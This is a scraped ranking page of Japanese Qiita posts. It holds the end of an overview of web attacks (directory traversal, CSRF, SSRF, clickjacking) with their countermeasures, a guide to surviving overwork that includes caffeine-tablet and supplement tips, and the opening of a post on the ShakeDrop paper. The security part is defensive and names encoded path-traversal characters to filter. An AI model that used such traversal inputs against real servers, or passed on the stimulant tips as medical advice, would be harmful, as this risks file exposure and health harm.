..(%2e%2e) /(%2e) ¥(%5c)といったディレクトリ移動に繋がる文字、HTMLエンコードはできるだけ弾きましょう。<br>
また、秘密ファイルへのアクセス権は厳重にしましょう。</p>

<h2>
<span id="csrfクロスサイトリクエストフォージェリ" class="fragment"></span><a href="#csrf%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%AA"><i class="fa fa-link"></i></a><strong><font color="red">CSRF(クロスサイトリクエストフォージェリ)</font></strong>
</h2>

<h2>
<span id="概要-8" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-8"><i class="fa fa-link"></i></a>概要</h2>

<p>正規ユーザの権限を利用し、特定の処理を促します。XSSのような受動的な攻撃で、Railsの<code>protect from forgery</code>やlaravelの<code>{{ csrf_field() }}</code>など、フレームワークではデフォルトで対策のための関数を多く見かけます。</p>

<h2>
<span id="例-7" class="fragment"></span><a href="#%E4%BE%8B-7"><i class="fa fa-link"></i></a>例</h2>

<p>特定の商品を購入させたり、メール強制送信、登録情報変更と、ユーザー権限を利用できるものすべてが可能な攻撃方法です。</p>

<h2>
<span id="対策-8" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-8"><i class="fa fa-link"></i></a>対策</h2>

<p>重要な処理の前では再認証を行ったり、ダブル認証など、認証機能にはなるべく気を払いましょう。CSRF Token設置が代表的な対策でしょうか。</p>

<h2>
<span id="ssrfサーバーサイドリクエストフォージェリ" class="fragment"></span><a href="#ssrf%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E3%82%B5%E3%82%A4%E3%83%89%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%AA"><i class="fa fa-link"></i></a><strong><font color="red">SSRF(サーバーサイドリクエストフォージェリ)</font></strong>
</h2>

<h2>
<span id="概要-9" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-9"><i class="fa fa-link"></i></a>概要</h2>

<p>Webサーバーがユーザーから送られてきた検証されていないパラメーターへの要求を実行するときに発生します。<br>
正規ユーザの権限を利用しリクエストを偽造するのがCSRFです。権限を利用した偽造攻撃という点で、CSRFの類似攻撃です。CSRFはリクエストに乗せて攻撃を行なっていたのに対し、SSRFはサーバーの権限を不正利用し、コマンドを実行します。</p>

<p><a href="https://blog.ohgaki.net/request-forgery-ssrf-and-csrf" rel="nofollow noopener" target="_blank">リクエストフォージェリ – SSRFとCSRF</a></p>

<blockquote>
<p>SSRF　サーバーが持つ権限・認証を利用して不正な命令を実行<br>
CSRF　クライアントが持つ権限・認証を利用して不正な命令を実行</p>
</blockquote>

<p>上記記事を参考にすると、<strong><em>クライアントサイド</em></strong>で起こるリクエスト偽造攻撃が<strong><em>CSRF</em></strong>、<strong><em>サーバーサイド</em></strong>で起こるリクエスト偽造攻撃が<strong><em>SSRF</em></strong>ということがわかり、リクエストフォージェリが何なのか腹落ちします。</p>

<blockquote>
<p>@shiracamus さんより<br>
<a href="https://www.owasp.org/index.php/Server_Side_Request_Forgery" rel="nofollow noopener" target="_blank">Server Side Request Forgery</a></p>
</blockquote>

<h2>
<span id="対策-9" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-9"><i class="fa fa-link"></i></a>対策</h2>

<p>リクエストのパラメータが予定しているパラメータなのか、バリデーションの徹底。</p>

<h2>
<span id="クリックジャッキング" class="fragment"></span><a href="#%E3%82%AF%E3%83%AA%E3%83%83%E3%82%AF%E3%82%B8%E3%83%A3%E3%83%83%E3%82%AD%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a><strong><font color="red">クリックジャッキング</font></strong>
</h2>

<h2>
<span id="概要-10" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-10"><i class="fa fa-link"></i></a>概要</h2>

<p>ログイン認証後画面にiframe要素、スタイルシートなどを駆使して罠を設置し、ユーザーの意図している動きに見せかけて、全く違う操作を行わせます。</p>

<p>比較的新しい攻撃のようです。</p>

<p><a href="https://nulab-inc.com/ja/blog/typetalk/measure-clickjacking/" rel="nofollow noopener" target="_blank">Webエンジニアだったら当然知っておきたい「 クリックジャッキング対策 」とは？</a></p>

<h2>
<span id="例-8" class="fragment"></span><a href="#%E4%BE%8B-8"><i class="fa fa-link"></i></a>例</h2>

<p>表示されたボタンをクリックするだけで操作が完了する画面があったとします。<br>
↓<br>
犯罪者はCSSのopacityなどを使い、攻撃対象画面を透明にしユーザーが操作していると思っている画面に、まるでビニールシートのような罠を設置します。<br>
↓<br>
ユーザーは自分が押していると思っていないボタンを押します。攻撃されたことにも気づきません。</p>

<h2>
<span id="対策-10" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-10"><i class="fa fa-link"></i></a>対策</h2>

<p>ヘッダのパラメータとして、<strong>X-Frame-Options</strong>を設定します。そして、DENYまたはSAMEORIGINを設定します。</p>

<p><a href="https://developer.mozilla.org/ja/docs/Web/HTTP/X-Frame-Options" rel="nofollow noopener" target="_blank">X-Frame-Options レスポンスヘッダ</a></p>

<h1>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h1>

<p>これだけ種類があると頭が混乱してしまいますが、Web業界にいる人は職種を問わずセキュリティの知識が必要だなと思わされる今日この頃です。</p>

<p>後半になるにつれて勉強不足で簡素になってしまいましたが、間違っている部分、足りない部分などあれば編集リクエストやコメントでご指摘頂きたいです。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">58位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>172</kbd>
		<a target="_blank" href="https://qiita.com/0w0/items/c6a47c9da3b37c99b0dd">【便乗記事】エンジニアがデスマーチを生き抜くための知見をまとめてみた　</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-05<br />14:59:06</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/154302.html">0w0</a>(7件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/154302/profile-images/1505133762">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[プロジェクト管理]</b> <b>[マネジメント]</b> <b>[エンジニア]</b> <b>[生存戦略]</b> <b>[デスマーチ]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="inspire-the-next" class="fragment"></span><a href="#inspire-the-next"><i class="fa fa-link"></i></a>Inspire the Next,</h2>

<blockquote>

<h3>
<span id="デスマサバイバルガイド" class="fragment"></span><a href="#%E3%83%87%E3%82%B9%E3%83%9E%E3%82%B5%E3%83%90%E3%82%A4%E3%83%90%E3%83%AB%E3%82%AC%E3%82%A4%E3%83%89"><i class="fa fa-link"></i></a><a href="http://blog.satotaichi.info/death-march_survival-guide/" rel="nofollow noopener" target="_blank">デスマサバイバルガイド</a>
</h3>

<p>僕はもう長い事デスマーチに関わることなく生きられているが、徐々に忘れつつあるので、若いころに獲得したデスマーチを生き残る方法論について記録しておく。</p>
</blockquote>

<p>良記事でござんした。<br>
大変良い刺激を受けたので、私も一つインスパイア的な記事を書いてみる次第。</p>

<h2>
<span id="使用上のご注意" class="fragment"></span><a href="#%E4%BD%BF%E7%94%A8%E4%B8%8A%E3%81%AE%E3%81%94%E6%B3%A8%E6%84%8F"><i class="fa fa-link"></i></a>使用上のご注意</h2>

<ul>
<li>当記事は炎上時の極限状態に対する対処療法集です</li>
<li>主な対象者として炎上案件に放り込まれた末端メンバーを想定しています

<ul>
<li>一部マネジメントの話題も含みます。鎮火を命じられたPMにとっても役立つ点がある筈</li>
</ul>
</li>
<li>インスパイア元同様、当記事も経験則を多分に含みます。活用は自己責任でｵﾅｼｬｽ</li>
<li>目の前の炎上に貴方の人生を賭けて良いかどうか、よく考えた上でご利用ください</li>
<li><del>けっきょくもやさないのがいちばんだいじなんだよなあ　みつを</del></li>
</ul>

<h2>
<span id="まず頭に入れて欲しい残業の知識" class="fragment"></span><a href="#%E3%81%BE%E3%81%9A%E9%A0%AD%E3%81%AB%E5%85%A5%E3%82%8C%E3%81%A6%E6%AC%B2%E3%81%97%E3%81%84%E6%AE%8B%E6%A5%AD%E3%81%AE%E7%9F%A5%E8%AD%98"><i class="fa fa-link"></i></a>まず頭に入れて欲しい残業の知識</h2>

<p>Twitterや匿名掲示板等のネット世論では「残業辛いわー、弊社マジファックだわー」みたいな意見が主流なので誤解しがちなのだが、実は<a href="http://www.rieti.go.jp/jp/publications/nts/16e037.html" rel="nofollow noopener" target="_blank"><strong>「残業はすればするほど仕事の満足度は上昇する（ただしメンタルはブッ壊れる）」</strong></a>という政策シンクタンクの研究がある。信じがたいことかも知れないが、<strong>そもそも人間は残業を「辛い」と感じるとは限らず、むしろ充足感を覚える場合が少なくない。</strong></p>

<p>「ハッピーならいいじゃん」と思う人もいるだろうが、よく上記の文章を読んで欲しい。<strong>「(ただしメンタルはブッ壊れる)」</strong>のである。ハッピーだからといって健康被害が無くなる訳ではない。ワーカーホリックが無くならない原因がここにある。</p>

<p>要は何が言いたいのかと言うと、<strong>「まだ働けないほど辛くないから大丈夫」「仕事が楽しいから大丈夫」という主観的な感覚は全くアテにならない</strong>ということである。大抵の人間は「おかしくなったら無理をやめる」という安直な戦略をとりがちだが、これは過労でおかしくなるルートの入り口である。長時間労働に晒された人間は、<strong>「おかしい」と感じてから行動するのではなく、予防措置を最優先にして立ち回らなければならない。</strong><sup id="fnref1"><a href="#fn1" rel="footnote" title="なお、「メンバーの様子を客観的に観察する」という行為が本来ならPMの業務であることは言うまでもない。">1</a></sup><br>
「自分自身でダメだと気付いた時」には、もう手遅れなのだ。</p>

<ul>
<li>「まだ大丈夫」という自分の感覚を信用しない</li>
<li>何事も予防的に行動する</li>
</ul>

<p>まずはこの2点を行動原理として徹底的に叩き込んで欲しい。</p>

<p>この意識付けは自身を守るだけでなくプロジェクトの鎮火にも役立つ。大半のデスマーチは危機予測能力の不足により発生する為である。</p>

<h2>
<span id="守るべき優先順位" class="fragment"></span><a href="#%E5%AE%88%E3%82%8B%E3%81%B9%E3%81%8D%E5%84%AA%E5%85%88%E9%A0%86%E4%BD%8D"><i class="fa fa-link"></i></a>守るべき優先順位</h2>

<p>以上の前提を踏まえつつ、炎上下では以下2点の維持を最優先事項とする。</p>

<ul>
<li>理性的な判断を下せる健全な精神</li>
<li>精神を支える正常な肉体</li>
</ul>

<p>これもまた前段同様、自身の為だけではなく、</p>

<ul>
<li>極論・過激思想の発生</li>
<li>メンバー同士の感情的なコンクリフト</li>
<li>計画能力の喪失と出口戦略の欠如</li>
<li>ケアレスミスの多発</li>
<li>弱った組織を狙う「悪い人たち」の暗躍</li>
</ul>

<p>等々、「残業が残業を増やす」ファクターを一網打尽に出来る故の措置である。綺麗事ではなく、「メンバー個人の健全性」は炎上そのものを食い止める為の第一歩であるということを意識しなければならない。</p>

<h2>
<span id="とは言うものの" class="fragment"></span><a href="#%E3%81%A8%E3%81%AF%E8%A8%80%E3%81%86%E3%82%82%E3%81%AE%E3%81%AE"><i class="fa fa-link"></i></a>とは言うものの…</h2>

<p>そもそも「健全性」を保証できる組織であればデスマーチなんて発生する訳もなく…。実際には、「健全ではない環境」において出来る限り精神と肉体を維持する為の生活設計を考案する必要性が出てくる。</p>

<p>というわけで、ここからは極限状態における生活手法についてTipsを記述する。繰り返しになるが、これらはあくまで対処療法に過ぎない。目の前の修羅場に人生を賭けるべきか否か、「正常」なうちに判断してから使うこと。</p>

<h2>
<span id="食生活について" class="fragment"></span><a href="#%E9%A3%9F%E7%94%9F%E6%B4%BB%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>食生活について</h2>

<ul>
<li>当たり前だが炎上時こそ真っ当な食事が大事

<ul>
<li>疲労が蓄積した人間は行動が極端になりやすく、ラーメン等の高カロリー食や、逆に「二食抜き」等の超小食生活に走りやすい。過不足無く「意識的に」食品を摂取すること</li>
</ul>
</li>
<li>
<strong>腸内フローラ超大事。</strong>腸に負担がないだけでストレス耐性が劇的に増加する。女子の様に気を使おう

<ul>
<li>やはり野菜は優秀。整腸作用のみならず、ビタミンその他においても優れた栄養素を持っている。<strong>せめて野菜ジュースでもよいので積極的に摂取する</strong>
</li>
<li>食物繊維はトクホ飲料やドラッグストアの怪しい健康食品（<a href="https://www.kobayashi.co.jp/brand/easyfiber/" rel="nofollow noopener" target="_blank"><strong>「イージーファイバー」</strong></a>や<a href="https://www.otsuka.co.jp/product/kenja_no/" rel="nofollow noopener" target="_blank"><strong>「賢者の食卓」</strong></a>などの粉もの）でも摂取可能</li>
<li>というか、そうでもしないと必要量の摂取は難しい。コンビニサラダに含まれるキャベツの千切りは<a href="https://yase.tech/1866.html" rel="nofollow noopener" target="_blank">食物繊維が意外に少ない</a>ので注意</li>
</ul>
</li>
</ul>

<h4>
<span id="そんな面倒なこと出来るかというアナタは" class="fragment"></span><a href="#%E3%81%9D%E3%82%93%E3%81%AA%E9%9D%A2%E5%80%92%E3%81%AA%E3%81%93%E3%81%A8%E5%87%BA%E6%9D%A5%E3%82%8B%E3%81%8B%E3%81%A8%E3%81%84%E3%81%86%E3%82%A2%E3%83%8A%E3%82%BF%E3%81%AF"><i class="fa fa-link"></i></a>「そんな面倒なこと出来るか！」というアナタは…</h4>

<ul>
<li>どうしても真っ当な食事できない場合、<strong>液体の完全栄養食</strong>を活用する

<ul>
<li>エンジニア界隈だと<a href="https://ja.wikipedia.org/wiki/%E3%82%BD%E3%82%A4%E3%83%AC%E3%83%B3%E3%83%88" rel="nofollow noopener" target="_blank"><strong>「Soylent」</strong></a>や<a href="http://www.comp.jp/" rel="nofollow noopener" target="_blank"><strong>「COMP」</strong></a>が有名だが、これらは職場近くの小売店で手に入らず、長時間労働下での調達が難しい。調達出来ない場合はコンビニやドラッグストアで流通している<a href="http://www.meiji.co.jp/meiji-eiyoucare/products/nutritionfood/meibalance_mini/" rel="nofollow noopener" target="_blank"><strong>「メイバランス」</strong></a>や<a href="http://www.morinagamilk-carefoods.jp/climeal/" rel="nofollow noopener" target="_blank"><strong>「クリミール」</strong></a>を使う</li>
<li>これらは病院食・介護食に使われる商品。消化が良く、胃腸に負担をかけない。<a href="https://yama-navi.blogspot.jp/2015/01/ration.html" rel="nofollow noopener" target="_blank">行動食として勧める登山家もいる</a>くらいなので糧食としては優秀</li>
<li>ただし、上記商品はCOMP等と違って<strong>三食置き換えはできない。</strong>あくまで補助食品と割り切ること（それでも不摂生な食生活よりよほどマシだが…）</li>
<li>なお、各完全栄養食品の栄養バランスは<a href="https://www.yogurtgeek.com/entry/comp-comparison/" rel="nofollow noopener" target="_blank">このサイト</a>が詳しい</li>
</ul>
</li>
<li>菓子パンオンリー生活はNG。腹はふくれてもいずれあらゆる部分がイカれるのでやめよう。<strong>死ぬぞ</strong>
</li>
</ul>

<h2>
<span id="睡眠について" class="fragment"></span><a href="#%E7%9D%A1%E7%9C%A0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>睡眠について</h2>

<ul>
<li>家に帰ったら風呂入ってさっさと寝る。何もしないで寝る。とっとと寝る</li>
<li>睡眠時間のプライオリティは非常に高い。<strong>寝るだけで高残業によるリスクは大部分回避できる。</strong>特に高残業下ではダラダラと単純作業を続ける癖がついてしまうので、意識的にブレーカーを落とそう

<ul>
<li>寝る前のネットサーフィンはNG</li>
<li>ソシャゲもNG</li>
<li>勉強もNG。調子こいてないでとっとと寝よう</li>
</ul>
</li>
<li>安眠の為にブルーライトは可能な限りカットする

<ul>
<li>iPhoneやMacはNightShiftをONにする</li>
<li>ルールが許すなら、職場PCにブルーライトカットのアプリを仕込むのも効果的</li>
<li>単純に画面の明るさを落とすだけでも目疲れ・睡眠の質は改善できる</li>
</ul>
</li>
<li>完徹が求められる場合でも必ず仮眠を取る

<ul>
<li>15分寝るだけでも業務の処理効率が全く違う</li>
</ul>
</li>
</ul>

<h2>
<span id="風呂について" class="fragment"></span><a href="#%E9%A2%A8%E5%91%82%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>風呂について</h2>

<ul>
<li>インスパイア元の記事にも特記があるが、風呂にはなるべく入った方がよい（これは私自身も実感アリ）

<ul>
<li>ただし無理は禁物。風呂場で眠り込み、溺れ死ぬリスクだけには注意しよう</li>
<li>科学的には<a href="https://ja.wikipedia.org/wiki/%E7%86%B1%E3%82%B7%E3%83%A7%E3%83%83%E3%82%AF%E3%82%BF%E3%83%B3%E3%83%91%E3%82%AF%E8%B3%AA" rel="nofollow noopener" target="_blank">HSP（ヒートショックプロテイン）</a>の作用が良い影響を与えるとか</li>
<li>
<a href="https://travel.spot-app.jp/tokyo_sento_yoppy/" rel="nofollow noopener" target="_blank">交互浴</a>はより劇的な効果が出る可能性があるが、過労時にやると心臓発作で死ぬ可能性が高いのでオススメはしない…</li>
</ul>
</li>
</ul>

<h2>
<span id="業務について" class="fragment"></span><a href="#%E6%A5%AD%E5%8B%99%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>業務について</h2>

<ul>
<li>定期休憩重要。長時間労働が続く時はダラダラと無限に働き続けてしまう為、無理矢理休んでメリハリを付けること

<ul>
<li>休憩は業務効率に寄与するとされるが、最も効果的なスパンは諸説ある</li>
<li>結局は「定期的に休憩を取る」という仕組み作りが一番大切なので、色々試してしっくりするものを選ぶのが良い（最近は<a href="http://d.hatena.ne.jp/keyword/%A5%DD%A5%E2%A5%C9%A1%BC%A5%ED%A5%C6%A5%AF%A5%CB%A5%C3%A5%AF" rel="nofollow noopener" target="_blank"><strong>「ポモドーロ・テクニック」</strong></a>が流行ってるらしいよ！）</li>
</ul>
</li>
<li>休憩時はスマホを見ない。本も読まない。何もしない

<ul>
<li>考えることもガマンする。飽きてもガマンする。すると…</li>
<li>
<strong>烈海王「奇跡が起こる」</strong>…もとい、尋常じゃなく回復する。騙されたと思って試してみよう！</li>
</ul>
</li>
<li>休憩時間が足りないときは<a href="https://yuchrszk.blogspot.jp/2017/03/blog-post_31.html" rel="nofollow noopener" target="_blank"><strong>「注意訓練」</strong></a>がリフレッシュにオススメ。疲労時特有のグルグル思考を止め、意識をキャリブレーションしてくれる

<ul>
<li>ハマれば効果は絶大で、効率性が上がる為に「時間の経過が遅くなる」ような錯覚を覚えることも…（ただし、「いつまで経っても一日が終わらない」という恐ろしい副作用も出るので注意）</li>
<li>私個人はリンク先の「注意切り替え」→「注意分割」を仕事の合間に3分、というセットをよく使う</li>
</ul>
</li>
<li>障害対応等で休憩できる状況にない場合は<a href="http://yuchrszk.blogspot.jp/2017/10/blog-post_4.html" rel="nofollow noopener" target="_blank"><strong>「タスクシフト」</strong></a>を多用する。同じ仕事で精神が摩耗することだけは避けよう</li>
</ul>

<h2>
<span id="計画について" class="fragment"></span><a href="#%E8%A8%88%E7%94%BB%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>計画について</h2>

<ul>
<li>このTipsはどちらかと言えばPM向けの話</li>
<li>炎上の長期化が目に見えているなら、<strong>計画能力の復旧は最優先に行った方が良い</strong>

<ul>
<li>「無計画な200時間/月」と「計画的な200時間/月」の労働では、同じ労働時間でも圧倒的に負担量が変わる</li>
<li>「暗闇の中で手探りしながら目的地まで歩く」のと「明るい場所を目的地まで歩く」のでは、<strong>全く同じ距離でも疲弊感が違う</strong>のと一緒</li>
<li>精度が低い杜撰な計画でも「自分の想定と実績にどれほど乖離があったのか」という事実を定量的に分析できるだけで鎮火速度はずっと早くなる。この軌道修正能力の獲得が、炎上時において最も大事</li>
<li><strong>計画は「守れている」時ではなく「守れなかった」際に最も効力を発揮する</strong></li>
<li>低品質の計画の提示が憚られる環境なら隠れてでもセルフ運用しよう</li>
</ul>
</li>
</ul>

<h2>
<span id="ひみつどうぐもとい栄養ドリンク等について" class="fragment"></span><a href="#%E3%81%B2%E3%81%BF%E3%81%A4%E3%81%A9%E3%81%86%E3%81%90%E3%82%82%E3%81%A8%E3%81%84%E6%A0%84%E9%A4%8A%E3%83%89%E3%83%AA%E3%83%B3%E3%82%AF%E7%AD%89%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>ひみつどうぐ（もとい、栄養ドリンク等について）</h2>

<ul>
<li>インスパイア元にもある通り、エナジードリンクは糖質とカフェインが多い

<ul>
<li>前者は血糖値の上下によってパフォーマンスにムラが発生し、後者は中毒化の恐れがある。つまりオススメしかねる</li>
</ul>
</li>
<li>これもまたインスパイア元と同様に、胃を壊しにくくカフェインが過剰でないお茶がオススメ

<ul>
<li>特に緑茶は<a href="https://ja.wikipedia.org/wiki/%E3%83%86%E3%82%A2%E3%83%8B%E3%83%B3" rel="nofollow noopener" target="_blank">テアニン</a>を含み、抗ストレスやパフォーマンスに良質な影響を与える</li>
</ul>
</li>
<li>同様に、カフェインと糖質が主体となる安い栄養ドリンクもオススメできない

<ul>
<li>リポD十本買うよりは「少し変かも」という時に1〜2本ちょい高めのドリンク or サプリを飲む方がオススメ（常飲はNG。1週間に1〜2本程度に留める）</li>
<li>なお、インスパイア元に「高いドリンクで鼻血云々」とあるが、それは服用上限を無視した or 別の病気が疑われるので、普通に医者行った方が良いかと…</li>
</ul>
</li>
<li>コンビニだと<strong>アルミパウチの錠剤サプリがコスパ良し</strong>

<ul>
<li>
<a href="http://hc.kowa.co.jp/otc/9755" rel="nofollow noopener" target="_blank">「キューピーコーワゴールド」</a>とか<a href="http://search.sato-seiyaku.co.jp/pub/search/dispproduct.php?productid=975&amp;ref=Command%3Dlistup%26SubCommand%3Dfreeword%26keyword%3D%25A5%25E6%25A5%25F3%25A5%25B1%25A5%25EB%26page%3D" rel="nofollow noopener" target="_blank">「ユンケルローヤル錠」</a>とか（ただしカフェイン入りなので量に注意）</li>
<li>ドラッグストアじゃないと手に入らないが、錠剤系だと<a href="http://alinamin.jp/lineup/alinaminexplus.html" rel="nofollow noopener" target="_blank">「アリナミンEX」</a>（か、その<a href="http://good-vitamin.net/neovitamin-ex-2/" rel="nofollow noopener" target="_blank">ジェネリック品</a>）が初心者でも効果を実感しやすい。<strong>フルスルチアミンはいいぞ</strong>
</li>
<li>やたら店が推してくる怪しい栄養ドリンク類も、生薬入りの割には非常にコスパが良い（<a href="http://www.kyoleopin.jp/" rel="nofollow noopener" target="_blank">「キヨーレオピン」</a>や<a href="http://www.kegg.jp/medicus-bin/japic_otc?japic_code=J0601005126" rel="nofollow noopener" target="_blank">「活蔘28」</a>など…）</li>
<li>なお、ユンケルスター等の最高級ドリンクは価格に見合う性能がないと思ってる（数回服用経験あり）。謎のリンゴ味で高級感はあるんだけどね…</li>
</ul>
</li>
<li>リスクを乗りこなせれば、なんだかんだでカフェインは強力無比。中毒などの副作用に適切な注意を払える人は<a href="https://www.ssp.co.jp/product/all/estm-t/" rel="nofollow noopener" target="_blank">「エスタロンモカ」</a>や<a href="https://togetter.com/li/1078356" rel="nofollow noopener" target="_blank">「トメルミン（絶対カフェイン中毒にするマン）」</a>の使用を検討してもよいかもしれない

<ul>
<li>上記をコーヒーやエナジードリンク等と併用するとあっという間に中毒化するのでやめよう</li>
</ul>
</li>
<li>少し入手難度が上がるが、ボディビルダーが使う「BCAA」「グルタミン」「アルギニン」も疲労回復に効く</li>
<li>直接的な疲労回復ではないが、「グリシン」というアミノ酸は睡眠の質を上げるとされる（いわゆる眠剤ではないので不眠には余り効果が無いが…）</li>
<li>ガチ勢はアメリカから多種多様なサプリ（主に<a href="https://ja.wikipedia.org/wiki/%E3%82%B9%E3%83%9E%E3%83%BC%E3%83%88%E3%83%89%E3%83%A9%E3%83%83%E3%82%B0" rel="nofollow noopener" target="_blank">スマートドラッグ</a>と呼ばれるもの）を個人輸入する。…が、この世界は沼なのでオススメはできない</li>
<li>所詮サプリ、されどサプリ。効果に過度な期待をせず、逆に副作用には敏感になるくらいがちょうど良い</li>
</ul>

<h2>
<span id="最後に忘れちゃいけない当たり前の話特にpm" class="fragment"></span><a href="#%E6%9C%80%E5%BE%8C%E3%81%AB%E5%BF%98%E3%82%8C%E3%81%A1%E3%82%83%E3%81%84%E3%81%91%E3%81%AA%E3%81%84%E5%BD%93%E3%81%9F%E3%82%8A%E5%89%8D%E3%81%AE%E8%A9%B1%E7%89%B9%E3%81%ABpm"><i class="fa fa-link"></i></a>最後に、忘れちゃいけない当たり前の話（特にPM）</h2>

<p>長時間労働で健康や精神状態を害さない最善の方法は、<strong>そもそも炎上させないこと</strong>である。<br>
「それが一番難しい」と思考停止する人も少なくないが、ぶっちゃけ炎上を鎮火させるのだってめちゃくちゃに難しい。近眼的な業務態度を持つ人や重度のワーカーホリックを増やしてしまう「後遺症」を考えると、今後を含めたトータル難度でいえば「炎上させない業務設計」の方がよほどイージーモードだとさえ言える。</p>

<p>全て燃え尽きた後で案件を振り返ると、燃える前に面倒を嫌わなければ大成功を収めていたであろうケースも少なくない。結局は「先に面倒を抱えて成功するか」「遠くない未来、なし崩し的に面倒と付き合うか」という二択の選択ミスが大半の炎上を引き起こす原因である。この記事を読んだあなたは、くれぐれもこの二択について明確な意思を持ってチームの業務に取り組んで欲しい。例えあなたが末端構成員で、目の前の出来事に決定権が無いように思えても意思は必ず周囲に伝播する。（言うまでも無くPMならなおさらである）</p>

<p>もし正しい意思を通そうとして、それでも駄目ならどうするかって？<br>
いざという時に「適切な道」を選び直す体力を残すために、この記事のノウハウがあるのでございますよ。グッドラック！</p>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p>なお、「メンバーの様子を客観的に観察する」という行為が本来ならPMの業務であることは言うまでもない。 <a href="#fnref1">↩</a></p>
</li>

</ol>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">59位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>170</kbd>
		<a target="_blank" href="https://qiita.com/yu4u/items/a9fc529c85534eca11e5">府大生が趣味ではなくニューラルネットワークの認識精度世界一を奪還してしまった論文を読んだ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-23<br />12:57:24</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/139809.html">yu4u</a>(22件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/139809/profile-images/1473721008">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[DeepLearning]</b> <b>[深層学習]</b> <b>[CNN]</b> <b>[論文読み]</b> <b>[ConvolutionalNeuralNetworks]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>本記事の前に下記の記事をどうぞ。<br>
<a href="https://qiita.com/yu4u/items/4a35b47d5cab8463a4cb" id="reference-6c618cad2883183726e0">府大生が趣味で世界一の認識精度を持つニューラルネットワークを開発してしまった論文を読んだ</a></p>

<p>（2017/10/24追記）ご本人よりShakeDropの論文では、2つを比較した上でCutoutではなく、Random Erasingを利用しているとコメントを頂きましたので修正しました。</p>

<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>府大生がニューラルネットワークの「認識精度世界一」を奪還してしまったようです。</p>

<blockquote class="twitter-tweet">
<p>一般物体認識分野「認識精度 世界一」を奪還！ 府大生が開発したニューラルネットワーク <a href="https://t.co/9HSt7iGl55" rel="nofollow noopener" target="_blank">https://t.co/9HSt7iGl55</a></p>— ニーシェス (@lachesis1120) <a href="https://twitter.com/lachesis1120/status/920931296867639297?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">2017年10月19日</a>
</blockquote>

<p>前回は趣味だったのが、今回は晴れて本業になったようです。<br>
具体的な内容は、10月に開催された<a href="http://www.ieice.org/iss/prmu/jpn/" rel="nofollow noopener" target="_blank">電子情報通信学会のパターン認識・メディア理解 (PRMU) 研究会</a>の技術報告<sup id="fnref1"><a href="#fn1" rel="footnote" title='山田良博, 岩村雅一, 黄瀬浩一, "PyramidNetに対する新たな確率的正則化手法ShakeDropの提案," 信学技報, 2017.'>1</a></sup>にありますので、解説していきたいと思います。<br>
こういう面白い発表がありますので、是非PRMU研究会に一度参加してみましょう！<a href="http://www.ieice.org/ken/program/index.php?tgs_regid=dcb3f5da17b46802a7ac54d2b097a59876c6cb3ce4786e95505fbc3a90fe24d9&amp;tgid=IEICE-PRMU&amp;lang=" rel="nofollow noopener" target="_blank">12月は東京開催</a>で、<a href="https://kantocv.connpass.com/" rel="nofollow noopener" target="_blank">コンピュータビジョン勉強会＠関東</a>と合同開催となっております。</p>

